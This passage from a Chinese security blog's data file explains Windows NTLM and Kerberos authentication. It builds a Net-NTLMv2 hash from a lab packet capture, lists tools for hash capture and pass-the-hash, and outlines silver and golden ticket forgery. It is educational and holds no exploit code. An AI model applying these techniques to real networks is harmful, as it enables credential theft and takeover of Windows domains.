10：192.168.1.101</li>\n<li>用户名：administrator</li>\n<li>密码：@superwu123</li>\n</ul>\n<p>抓包分析：</p>\n<p>先来看一下抓到的包总体情况,如下图。</p>\n<p><img src=\"/2019/04/03/01-Windows认证之NTLM/V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406111646.png\" alt></p>\n<p>接下来我们直接看NTLM认证过程的第二个数据包，可以看到服务器返回了Challenge，记作<code>NTLM Server Challenge</code>，值为：<code>79f3c64adead4f15</code>。</p>\n<p><img src=\"/2019/04/03/01-Windows认证之NTLM/V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406112000.png\" alt></p>\n<p><strong>Net-NTLM Hash</strong></p>\n<p>这里插入一段介绍Net-NTLM Hash。</p>\n<blockquote>\n<p>Net-NTLM Hash用于Net-NTLM协议进行网络身份验证（它们来自质询/响应算法，并基于用户的<code>NT Hash</code>）。</p>\n<p>Net-NTLM Hash我认为并不是具体的一种Hash值，而是一种格式，从NTLM认证过程数据包中提取一些信息拼凑起来得到的格式。</p>\n<p>根据协议版本的不同，Net-NTLM Hash又分为<code>Net-NTLMv1 Hash</code>和<code>Net-NTLMv2 Hash</code>。</p>\n</blockquote>\n<p><code>Net-NTLMv2 Hash</code>格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username::hostname:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>\n<p>username即用户名。</p>\n<p>hostname即服务器IP（或主机名）。</p>\n<p>challenge是Server Challenge，即服务器返回的随机数。</p>\n<p>HMAC-MD5对应数据包中的<code>NTProofStr</code>字段。</p>\n<p>blob对应数据包中<code>NTLMv2 Response</code>的<code>NTProofStr</code>之后的部分。</p>\n<p>紧接着我们看下一个数据包（Response），可以先看到有一个<code>NTLM v2 Response</code>，然后<code>NTLMv2 Client Challenge</code>就是客户端加密<code>Server Challenge</code>得到的。</p>\n<blockquote>\n<ul>\n<li>NTLM v2 Response值为：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 09 68 4a af 9d 32 8a 4c c2 3c 30 1d 70 61 23 2d</span><br><span class=\"line\">&gt; 01 01 00 00 00 00 00 00 32 3b 26 fa 22 ec d4 01</span><br><span class=\"line\">&gt; ae d4 bf 39 51 49 f6 4e 00 00 00 00 02 00 1e 00</span><br><span class=\"line\">&gt; 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00 55 00</span><br><span class=\"line\">&gt; 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00 01 00</span><br><span class=\"line\">&gt; 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00</span><br><span class=\"line\">&gt; 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00</span><br><span class=\"line\">&gt; 04 00 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00</span><br><span class=\"line\">&gt; 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00</span><br><span class=\"line\">&gt; 31 00 03 00 1e 00 57 00 49 00 4e 00 2d 00 55 00</span><br><span class=\"line\">&gt; 52 00 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00</span><br><span class=\"line\">&gt; 52 00 31 00 07 00 08 00 32 3b 26 fa 22 ec d4 01</span><br><span class=\"line\">&gt; 06 00 04 00 02 00 00 00 08 00 30 00 30 00 00 00</span><br><span class=\"line\">&gt; 00 00 00 00 01 00 00 00 00 20 00 00 83 61 12 00</span><br><span class=\"line\">&gt; 1b 95 5a d5 09 15 f1 c9 06 70 51 a1 67 f3 56 d3</span><br><span class=\"line\">&gt; 3e 2b ab 5f b2 63 49 b2 ca 9f 05 49 0a 00 10 00</span><br><span class=\"line\">&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class=\"line\">&gt; 09 00 24 00 63 00 69 00 66 00 73 00 2f 00 31 00</span><br><span class=\"line\">&gt; 39 00 32 00 2e 00 31 00 36 00 38 00 2e 00 31 00</span><br><span class=\"line\">&gt; 2e 00 31 00 30 00 32 00 00 00 00 00 00 00 00 00</span><br><span class=\"line\">&gt; 00 00 00 00</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<ul>\n<li>NTLMv2 Client Challenge值为：<code>aed4bf395149f64e</code></li>\n</ul>\n</blockquote>\n<p><img src=\"/2019/04/03/01-Windows认证之NTLM/V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406112206.png\" alt></p>\n<p>我们可以从数据包中提取并构建出<code>Net-NTLM Hash</code>：</p>\n<p>username即<code>administrator</code>。</p>\n<p>hostname即<code>192.168.1.102</code>。</p>\n<p>challenge即<code>79f3c64adead4f15</code>。（这里要注意的是是Server Challenge，而不是Client Challenge）</p>\n<p>HMAC-MD5即<code>09684aaf9d328a4cc23c301d7061232d</code>。</p>\n<p>blob即：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01 01 00 00 00 00 00 00 32 3b 26 fa 22 ec d4 01</span><br><span class=\"line\">ae d4 bf 39 51 49 f6 4e 00 00 00 00 02 00 1e 00</span><br><span class=\"line\">57 00 49 00 4e 00 2d 00 55 00 52 00 41 00 55 00</span><br><span class=\"line\">30 00 4c 00 4a 00 42 00 37 00 52 00 31 00 01 00</span><br><span class=\"line\">1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00</span><br><span class=\"line\">55 00 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00</span><br><span class=\"line\">04 00 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00</span><br><span class=\"line\">41 00 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00</span><br><span class=\"line\">31 00 03 00 1e 00 57 00 49 00 4e 00 2d 00 55 00</span><br><span class=\"line\">52 00 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00</span><br><span class=\"line\">52 00 31 00 07 00 08 00 32 3b 26 fa 22 ec d4 01</span><br><span class=\"line\">06 00 04 00 02 00 00 00 08 00 30 00 30 00 00 00</span><br><span class=\"line\">00 00 00 00 01 00 00 00 00 20 00 00 83 61 12 00</span><br><span class=\"line\">1b 95 5a d5 09 15 f1 c9 06 70 51 a1 67 f3 56 d3</span><br><span class=\"line\">3e 2b ab 5f b2 63 49 b2 ca 9f 05 49 0a 00 10 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class=\"line\">09 00 24 00 63 00 69 00 66 00 73 00 2f 00 31 00</span><br><span class=\"line\">39 00 32 00 2e 00 31 00 36 00 38 00 2e 00 31 00</span><br><span class=\"line\">2e 00 31 00 30 00 32 00 00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00</span><br></pre></td></tr></table></figure>\n<p>最终结果为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">administrator::192.168.1.102:79f3c64adead4f15:09684aaf9d328a4cc23c301d7061232d:0101000000000000323b26fa22ecd401aed4bf395149f64e0000000002001e00570049004e002d00550052004100550030004c004a00420037005200310001001e00570049004e002d00550052004100550030004c004a00420037005200310004001e00570049004e002d00550052004100550030004c004a00420037005200310003001e00570049004e002d00550052004100550030004c004a00420037005200310007000800323b26fa22ecd40106000400020000000800300030000000000000000100000000200000836112001b955ad50915f1c9067051a167f356d33e2bab5fb26349b2ca9f05490a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003200000000000000000000000000</span><br></pre></td></tr></table></figure>\n<p><strong>使用中间人攻击的方式可以获取Net-NTLM hash，常用工具为Responder和Inveigh。</strong></p>\n<p><strong>NTLM v1/v2区别：</strong></p>\n<p>认证的流程是一样的，不同的地方在于：</p>\n<blockquote>\n<ul>\n<li>Challage长度：NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。</li>\n<li>加密Challenge的算法：NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。</li>\n</ul>\n</blockquote>\n<h3 id=\"0x05-Pass-The-Hash\"><a href=\"#0x05-Pass-The-Hash\" class=\"headerlink\" title=\"0x05 Pass The Hash\"></a>0x05 Pass The Hash</h3><p>观察NTLM认证的过程可以发现，整个过程中实际上并没有进行明文密码的传递，也没有使用明文密码来加密Challenge，而是用明文密码对应<code>NT Hash</code>来加密<code>Challenge</code>，那么就意味着：</p>\n<blockquote>\n<p>只要我们知道相应用户密码的<code>NT Hash</code>，我们就可以自己构造出<code>Response</code>发送给服务器，从而通过验证。我们并不需要知道用户的明文密码。这种攻击方式就称之为哈希传递（Pass The Hash）。</p>\n</blockquote>\n<p>常用哈希传递攻击的工具：</p>\n<ul>\n<li>Smbmap</li>\n<li>Smbexec</li>\n<li>Metasploit psexec</li>\n<li>CrackMapExec</li>\n</ul>\n<p><strong>参考资料</strong></p>\n<p><a href=\"https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4\" target=\"_blank\" rel=\"noopener\">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>\n<p><a href=\"https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\" target=\"_blank\" rel=\"noopener\">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</a></p>\n<p><a href=\"http://www.adshotgyan.com/2012/02/lm-hash-and-nt-hash.html\" target=\"_blank\" rel=\"noopener\">http://www.adshotgyan.com/2012/02/lm-hash-and-nt-hash.html</a></p>\n<p><a href=\"https://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#0x00-%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81\" target=\"_blank\" rel=\"noopener\">https://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#0x00-%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81</a></p>\n<p><a href=\"https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/\" target=\"_blank\" rel=\"noopener\">https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/</a></p>\n<p><a href=\"https://xz.aliyun.com/t/2205\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2205</a></p>\n<p><a href=\"https://github.com/crazywa1ker/DarthSidious-Chinese/blob/master/getting-started/intro-to-windows-hashes.md\" target=\"_blank\" rel=\"noopener\">https://github.com/crazywa1ker/DarthSidious-Chinese/blob/master/getting-started/intro-to-windows-hashes.md</a></p>"},{"title":"Windows认证之Kerberos","date":"2019-04-03T03:58:35.000Z","_content":"\n### 0x00 Kerberos\n\n![](02-Windows认证之Kerberos\\cerberus.jpg)\n\nKerberos起源于希腊神话，是一只守护着冥界长着3个头颅的神犬，在Kerberos认证中，Kerberos的3个头颅也代表认证过程中涉及的三方：Client、Server、KDC。\n\nKerberos是一种网络认证协议，它允许某实体在非安全网络环境下，向另一个实体以一种安全的方式证明自己的身份。\n\nWindows的AD域环境使用Kerberos来进行验证。\n\n<!-- more -->\n\n### 0x01 Long-term Key与Short-term Key\n\n在 Security 领域中，有的密钥可能长期保持不变，比如你的密码，可能几年都不曾改变，这样的 Key 被称为 `Long-term Key`。\n\n使用`Long-term Key`应该有以下原则：\n\n> 1.被`Long-term Key`加密的数据包不应在网络中传输，或者说不要用`Long-term Key`加密数据包。原因在于如果加密的数据包被攻击者抓包截取，那么只要时间充足，密钥被爆破出来的风险是很大的。\n>\n> 2.`Long-term Key`不应该使用明文方式存储，好的方法是用摘要算法计算其Hash值，从而保存Hash值。因为我们知道Hash算法是不可逆的，且不同输入计算出来的Hash是不同的，因此理论上拥有Hash值是不可能逆向破解获得明文Key，除非进行Hash碰撞，即对Hash算法尝试不同的输入，然后将算法输出Hash值与我们要破解的Hash值对比，本质是暴力破解。\n\n我们一般会使用 `Short-term Key` 来加密需要进行网络传输的数据。顾名思义，这种 Key 只在短时间内有效，因此即使被加密的数据包被黑客截获，等他把 Key 计算出来的时候，这个 Key 也早就已经失效了。\n\n由此我们也引出一个问题：\n\n我们知道加密通信数据应该使用`Short-term Key`，但是`Short-term Key`作为一个短期有效的密钥，其管理分发是一个问题，即通信双方该如何即安全又便捷的协商出一个只有双方知道的`Short-term Key`呢？\n\nKerberos认证的第一阶段和第二阶段其实就是协商出通信所需的`Short-term Key`的过程。\n\n在Kerberos认证中，`Short-term Ke`被称为`Session Key`。而Windows用户的密码就是我们前面说的`Long-term Key`，它以`NTLM Hash`方式存储在服务器中。\n\n### 0x02 KDC(Key Distribution Center)\n\nKDC(Key Distribution Center)，即密钥分发中心，作为第三方信任机构为C/S提供认证。\n\n担任KDC的角色在物理层面上与DC(Domain Controller)，即域控所属同一主机。\n\nKDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下部分组成：\n\n> - AS（Authentication Service）：主要用于生成Client与TGS通信的`Session Key`，记`K(c,tgs)`以及TGT。\n> - TGS（Ticket Granting Service）：主要用于生成Client与Server通信的`Session Key`，记`K(c,s)`以及Tiket。\n\nAD(Account Database)，它作为账户管理数据库，用与存储用户认证信息，即密码的`NTLM Hash`等。\n\n### 0x03 Kerberos认证大致流程\n\n![](02-Windows认证之Kerberos\\1070321-20180417175541960-360210611.png)\n\n第一阶段（AS Exchange）：生成一个用于加密Client与TGS的通信的`Session Key`。\n\n> 生成`K(c,tgs)`的两份Copy，一份加密用于给Client，一份加密为TGT用于给TGS（但先发给Client，让其发给TGS）。\n\n第二阶段（TGS Exchange）：生成一个用于加密Client与Server通信的`Session Key`。\n\n> 生成`K(c,s)`的两份Copy，一份加密用于给Client，一份加密为Tiket用于给Server（但先发给Client，让其发给Server）。\n\n第三阶段（CS EXchange）：Client与Server之间验证并使用`K(c,s)`加密通信。\n\n### 0x04 Kerberos认证第一阶段：Authentication Service Exchange\n\n![](02-Windows认证之Kerberos\\QQ截图20190403201648.png)\n\n**KRB_AS_REQ**\n\n首先，客户端发送请求给KDC AS，请求消息包含以下三部分：\n\n> - `Pre-authentication data`：用以证明Client身份的信息，它的内容是一般是被Client的`NTLM Hash`加密的 `Timestamp`。\n> - `Client name & realm`：Client自身信息，简单地说就是 `DomainName\\Username`，KDC AS用其查找AD数据库看用户是否存在。\n> - `Server Name`：注意这里的ServerName并不是Client实际想要通信的Server，而是KDC TGS服务器的名称。\n\n**KRB_AS_REP**\n\nKDC收到请求消息后，根据提供的用户名在`AD(Account Database)`中寻找是否存在。\n\n若存在，则将产生一个`Session Key`，记`K(c,tgs)`，并且将其生成两份Copy，分别用于给Client和KDC TGS。\n\n对于给Client的那份`Session Key`，KDS AS会从`AD(Account Database)`中获取Client的`NTLM Hash`对其进行加密。\n\n对于给KDC TGS的那份`Session Key`，KDS AS会从`AD(Account Database)`中获取`krbtgt`用户的`NTLM Hash`对其及其它信息进行加密，称为TGT（Ticket Granting Ticket）。\n\n> - TGT中除了`Session Key`，还包括一些Client的用户名（DomainName\\Username）、End time（TGT 到期的时间）等信息。\n> - `krbtgt`用户是在新建一台域控制器时，由系统自动创建使得，用于Kerberos认证用的。因此TGT只有KDC能解密。\n\n虽然产生的TGT是用于给KDC TGS的，但是KDC还是会把两份都发给Client，KDC TGS那份由Client发给KDC TGS。之所以这样做的目的是：\n\n> - 首先Server不用维护一张庞大的会话密钥列表来应付不同的Client的访问，降低了Server的负荷；\n> - 其次避免出现因为网络延时，Client的认证请求比Server的会话密钥早到达Server端，进而导致认证失败的情况。\n\n### 0x05 Kerberos认证第二阶段：Ticket Granting Service Exchange\n\n![](02-Windows认证之Kerberos\\QQ截图20190403202909.png)\n\n**KRB_TGS_REQ**\n\n根据前面我们可以知道，此时Client拥有两份加密的`Session Key`，分别是\n\n> - 用自己`NTLM Hash`加密的`Session Key`。\n> - 用`krbtgt`用户的`NTLM Hash`加密的TGT。\n\n首先，Client会使用自己的`NTLM Hash`解密属于自己的那份，解密后获得`Session Key`。\n\n接着，Client会生成鉴别码（Authenticator），并使用`Session Key`对鉴别码进行加密。\n\n> 鉴别码实际主要是Client的信息（DomainName\\Username）、ServerName(DomainName\\Server)以及当前时间的时间戳。\n>\n> 此处的ServerName是Client真正想访问的Server。\n>\n> 鉴别码的作用主要是为了证明该消息是Client自己发的。\n\n最后，Client将加密的鉴别码与TGT发给KDC TGS。\n\n**KRB_TGS_REP**\n\nKDC TGS收到消息后，先使用自己（krbtgt）的`NTLM Hash`对TGT进行解密，获得`Session Key`、Client信息、TGT过期时间等信息。\n\n然后使用`Session Key`解密被Client加密的鉴别码，获得Client信息、时间戳等信息。\n\n比对两次解密得到的时间戳，确保在可允许的范围。\n\n时间同步的重要性：\n\n> 我们知道不管是Session Key还是票据都是有时效性的，TGT通常是8个小时，时效性的判断主要是用数据包传递的时间戳（Timestamp）与本地的时间做比较，因此Client、Server、KDC三者的时间同步是很重要，否则可能会造成验证失败，通常它们都需要配置从同一时间服务器同步时间。\n\n验证通过后，KDC TGS会生成一个`Session Key`，记`K(c,s)`，该`Session Key`用于给Client和Server通信使用。\n\n将`K(c,tgs)`加密`K(c,s)`，用于给Client。\n\n同时也会生成一个Tiket用于给Server，并用Server的`NTLM Hash`加密该Tiket。Tiket包含：\n\n> - 用于给Client和Server通信使用`Session key`，即`K(c,s)`。\n> - Client的一些信息，如用户名。\n> - Tiket过期时间。\n\n可以发现这个阶段与上一个阶段是类似，KDC同样会把这两份加密了的`Session Key`都发给Client。\n\n### 0x06 Kerberos认证第三阶段：Client/Server Exchange\n\n**KRB_AP_REQ**\n\n此时Client同样拥有两份加密的`Session Key`，`K(c,s)`。分别是\n\n> - 用自己`NTLM Hash`加密的`Session Key`。\n> - 用Server的`NTLM Hash`加密的Tiket。\n\n接着Client会使用自己的`NTLM Hash`解密属于自己的那份，解密后获得`K(c,s)`。\n\n使用`K(c,s)`加密鉴别码，将加密的鉴别码同Tiket发给服务器。\n\n**KRB_AP_REP**\n\nServer收到消息后，先使用自己的`NTLM Hash`对Tiket进行解密，获得`Session Key`、Client信息、TGT过期时间等信息。\n\n然后使用`Session Key`解密被Client加密的鉴别码，获得Client信息、时间戳等信息。\n\n过程与`KRB_TGS_REP`阶段差不多，不再赘述。\n\n但有一点是，\n\n如果Client需要进行双向验证，Server从鉴别码中提取时间戳，使用`K(c,s)`进行加密，并将其发送给Client用于Client验证Server的身份。\n\n### 白银票据（Silver Tiket）\n\n通过前面我们已经知道Kerberos的认证大致流程，在第三阶段认证的`KRB_AP_REQ`时，Client拥有两份加密的`Session Key`，`K（c,s）`分别是：\n\n> - 用自己`NTLM Hash`加密的`Session Key`。\n> - 用Server的`NTLM Hash`加密的Tiket。\n\nTiket只有Server可以解密，这是因为Tiket是使用Server的`NTLM Hash`进行加密的。但是这也意味着如果我们拥有Server的Hash，那么意味着我们可以解密以及伪造Tiket，从而绕过KDC直接进行验证。\n\n### 黄金票据（Golden Tiket）\n\n通过前面我们已经知道Kerberos的认证大致流程，在第二阶段认证的`KRB_AS_REQ`时，Client拥有两份加密的`Session Key`，`K（c,tgs）`分别是：\n\n> - 用自己`NTLM Hash`加密的`Session Key`。\n> - 用`krbtgt`用户的`NTLM Hash`加密的TGT。\n\n前面我们说过，TGT只有KDC可以解密，这是因为TGT是使用`krbtgt`用户的`NTLM Hash`进行加密的，而该Hash只有KDC知道。但是这也意味着如果我们拥有`krbtgt`用户的Hash，那么意味着我们可以解密以及伪造TGT，\n\n**参考资料：**\n\nhttps://blog.csdn.net/lengxiao1993/article/details/20458809\n\nhttps://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB---kerbroes\n\nhttps://klionsec.github.io/2016/08/10/ntlm-kerberos/?tdsourcetag=s_pcqq_aiomsg\n\nhttps://blog.csdn.net/wulantian/article/details/42418231","source":"_posts/02-Windows认证之Kerberos.md","raw":"---\ntitle: Windows认证之Kerberos\ndate: 2019-04-03 11:58:35\ntags: \n\t- Kerberos\ncategories: 内网渗透\n---\n\n### 0x00 Kerberos\n\n![](02-Windows认证之Kerberos\\cerberus.jpg)\n\nKerberos起源于希腊神话，是一只守护着冥界长着3个头颅的神犬，在Kerberos认证中，Kerberos的3个头颅也代表认证过程中涉及的三方：Client、Server、KDC。\n\nKerberos是一种网络认证协议，它允许某实体在非安全网络环境下，向另一个实体以一种安全的方式证明自己的身份。\n\nWindows的AD域环境使用Kerberos来进行验证。\n\n<!-- more -->\n\n### 0x01 Long-term Key与Short-term Key\n\n在 Security 领域中，有的密钥可能长期保持不变，比如你的密码，可能几年都不曾改变，这样的 Key 被称为 `Long-term Key`。\n\n使用`Long-term Key`应该有以下原则：\n\n> 1.被`Long-term Key`加密的数据包不应在网络中传输，或者说不要用`Long-term Key`加密数据包。原因在于如果加密的数据包被攻击者抓包截取，那么只要时间充足，密钥被爆破出来的风险是很大的。\n>\n> 2.`Long-term Key`不应该使用明文方式存储，好的方法是用摘要算法计算其Hash值，从而保存Hash值。因为我们知道Hash算法是不可逆的，且不同输入计算出来的Hash是不同的，因此理论上拥有Hash值是不可能逆向破解获得明文Key，除非进行Hash碰撞，即对Hash算法尝试不同的输入，然后将算法输出Hash值与我们要破解的Hash值对比，本质是暴力破解。\n\n我们一般会使用 `Short-term Key` 来加密需要进行网络传输的数据。顾名思义，这种 Key 只在短时间内有效，因此即使被加密的数据包被黑客截获，等他把 Key 计算出来的时候，这个 Key 也早就已经失效了。\n\n由此我们也引出一个问题：\n\n我们知道加密通信数据应该使用`Short-term Key`，但是`Short-term Key`作为一个短期有效的密钥，其管理分发是一个问题，即通信双方该如何即安全又便捷的协商出一个只有双方知道的`Short-term Key`呢？\n\nKerberos认证的第一阶段和第二阶段其实就是协商出通信所需的`Short-term Key`的过程。\n\n在Kerberos认证中，`Short-term Ke`被称为`Session Key`。而Windows用户的密码就是我们前面说的`Long-term Key`，它以`NTLM Hash`方式存储在服务器中。\n\n### 0x02 KDC(Key Distribution Center)\n\nKDC(Key Distribution Center)，即密钥分发中心，作为第三方信任机构为C/S提供认证。\n\n担任KDC的角色在物理层面上与DC(Domain Controller)，即域控所属同一主机。\n\nKDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下部分组成：\n\n> - AS（Authentication Service）：主要用于生成Client与TGS通信的`Session Key`，记`K(c,tgs)`以及TGT。\n> - TGS（Ticket Granting Service）：主要用于生成Client与Server通信的`Session Key`，记`K(c,s)`以及Tiket。\n\nAD(Account Database)，它作为账户管理数据库，用与存储用户认证信息，即密码的`NTLM Hash`等。\n\n### 0x03 Kerberos认证大致流程\n\n![](02-Windows认证之Kerberos\\1070321-20180417175541960-360210611.png)\n\n第一阶段（AS Exchange）：生成一个用于加密Client与TGS的通信的`Session Key`。\n\n> 生成`K(c,tgs)`的两份Copy，一份加密用于给Client，一份加密为TGT用于给TGS（但先发给Client，让其发给TGS）。\n\n第二阶段（TGS Exchange）：生成一个用于加密Client与Server通信的`Session Key`。\n\n> 生成`K(c,s)`的两份Copy，一份加密用于给Client，一份加密为Tiket用于给Server（但先发给Client，让其发给Server）。\n\n第三阶段（CS EXchange）：Client与Server之间验证并使用`K(c,s)`加密通信。\n\n### 0x04 Kerberos认证第一阶段：Authentication Service Exchange\n\n![](02-Windows认证之Kerberos\\QQ截图20190403201648.png)\n\n**KRB_AS_REQ**\n\n首先，客户端发送请求给KDC AS，请求消息包含以下三部分：\n\n> - `Pre-authentication data`：用以证明Client身份的信息，它的内容是一般是被Client的`NTLM Hash`加密的 `Timestamp`。\n> - `Client name & realm`：Client自身信息，简单地说就是 `DomainName\\Username`，KDC AS用其查找AD数据库看用户是否存在。\n> - `Server Name`：注意这里的ServerName并不是Client实际想要通信的Server，而是KDC TGS服务器的名称。\n\n**KRB_AS_REP**\n\nKDC收到请求消息后，根据提供的用户名在`AD(Account Database)`中寻找是否存在。\n\n若存在，则将产生一个`Session Key`，记`K(c,tgs)`，并且将其生成两份Copy，分别用于给Client和KDC TGS。\n\n对于给Client的那份`Session Key`，KDS AS会从`AD(Account Database)`中获取Client的`NTLM Hash`对其进行加密。\n\n对于给KDC TGS的那份`Session Key`，KDS AS会从`AD(Account Database)`中获取`krbtgt`用户的`NTLM Hash`对其及其它信息进行加密，称为TGT（Ticket Granting Ticket）。\n\n> - TGT中除了`Session Key`，还包括一些Client的用户名（DomainName\\Username）、End time（TGT 到期的时间）等信息。\n> - `krbtgt`用户是在新建一台域控制器时，由系统自动创建使得，用于Kerberos认证用的。因此TGT只有KDC能解密。\n\n虽然产生的TGT是用于给KDC TGS的，但是KDC还是会把两份都发给Client，KDC TGS那份由Client发给KDC TGS。之所以这样做的目的是：\n\n> - 首先Server不用维护一张庞大的会话密钥列表来应付不同的Client的访问，降低了Server的负荷；\n> - 其次避免出现因为网络延时，Client的认证请求比Server的会话密钥早到达Server端，进而导致认证失败的情况。\n\n### 0x05 Kerberos认证第二阶段：Ticket Granting Service Exchange\n\n![](02-Windows认证之Kerberos\\QQ截图20190403202909.png)\n\n**KRB_TGS_REQ**\n\n根据前面我们可以知道，此时Client拥有两份加密的`Session Key`，分别是\n\n> - 用自己`NTLM Hash`加密的`Session Key`。\n> - 用`krbtgt`用户的`NTLM Hash`加密的TGT。\n\n首先，Client会使用自己的`NTLM Hash`解密属于自己的那份，解密后获得`Session Key`。\n\n接着，Client会生成鉴别码（Authenticator），并使用`Session Key`对鉴别码进行加密。\n\n> 鉴别码实际主要是Client的信息（DomainName\\Username）、ServerName(DomainName\\Server)以及当前时间的时间戳。\n>\n> 此处的ServerName是Client真正想访问的Server。\n>\n> 鉴别码的作用主要是为了证明该消息是Client自己发的。\n\n最后，Client将加密的鉴别码与TGT发给KDC TGS。\n\n**KRB_TGS_REP**\n\nKDC TGS收到消息后，先使用自己（krbtgt）的`NTLM Hash`对TGT进行解密，获得`Session Key`、Client信息、TGT过期时间等信息。\n\n然后使用`Session Key`解密被Client加密的鉴别码，获得Client信息、时间戳等信息。\n\n比对两次解密得到的时间戳，确保在可允许的范围。\n\n时间同步的重要性：\n\n> 我们知道不管是Session Key还是票据都是有时效性的，TGT通常是8个小时，时效性的判断主要是用数据包传递的时间戳（Timestamp）与本地的时间做比较，因此Client、Server、KDC三者的时间同步是很重要，否则可能会造成验证失败，通常它们都需要配置从同一时间服务器同步时间。\n\n验证通过后，KDC TGS会生成一个`Session Key`，记`K(c,s)`，该`Session Key`用于给Client和Server通信使用。\n\n将`K(c,tgs)`加密`K(c,s)`，用于给Client。\n\n同时也会生成一个Tiket用于给Server，并用Server的`NTLM Hash`加密该Tiket。Tiket包含：\n\n> - 用于给Client和Server通信使用`Session key`，即`K(c,s)`。\n> - Client的一些信息，如用户名。\n> - Tiket过期时间。\n\n可以发现这个阶段与上一个阶段是类似，KDC同样会把这两份加密了的`Session Key`都发给Client。\n\n### 0x06 Kerberos认证第三阶段：Client/Server Exchange\n\n**KRB_AP_REQ**\n\n此时Client同样拥有两份加密的`Session Key`，`K(c,s)`。分别是\n\n> - 用自己`NTLM Hash`加密的`Session Key`。\n> - 用Server的`NTLM Hash`加密的Tiket。\n\n接着Client会使用自己的`NTLM Hash`解密属于自己的那份，解密后获得`K(c,s)`。\n\n使用`K(c,s)`加密鉴别码，将加密的鉴别码同Tiket发给服务器。\n\n**KRB_AP_REP**\n\nServer收到消息后，先使用自己的`NTLM Hash`对Tiket进行解密，获得`Session Key`、Client信息、TGT过期时间等信息。\n\n然后使用`Session 